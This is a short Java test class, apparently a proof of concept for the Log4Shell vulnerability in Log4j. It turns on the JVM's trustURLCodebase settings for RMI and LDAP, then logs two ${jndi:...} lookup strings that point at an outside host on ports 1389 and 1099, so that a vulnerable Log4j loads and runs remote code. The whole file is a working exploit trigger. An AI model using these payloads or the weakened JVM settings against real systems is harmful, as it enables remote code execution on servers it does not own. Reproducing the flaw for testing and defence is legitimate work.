import lombok.extern.log4j.Log4j2;

@Log4j2
public class Test {
    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");



        log.error("${jndi:ldap://legend-tech.com:1389/y4uvzi}");
        log.error("${jndi:rmi://legend-tech.com:1099/y4uvzi}");


    }
}
